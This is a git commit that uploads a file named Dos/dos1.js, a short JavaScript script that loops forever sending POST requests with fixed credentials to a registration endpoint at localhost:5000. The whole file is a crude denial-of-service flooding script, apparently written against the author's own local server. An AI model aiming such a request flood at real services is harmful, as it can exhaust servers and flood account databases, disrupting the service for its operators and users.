23336489867cce921cad04068719b6f0c1da9e5a
micahGrace <37737222+micahGrace@users.noreply.github.com>
2018-04-03 21:49:52 +0300

    Add files via upload

---
+++ Dos/dos1.js
@@ -0,0 +1,7 @@
+while(true){
+ //  alert(); 
+$.post('http://localhost:5000/register', {username:"dagim",password:"dagim"}, function(data){
+            //if the user registers  succesfully
+               
+       }); 
+  }
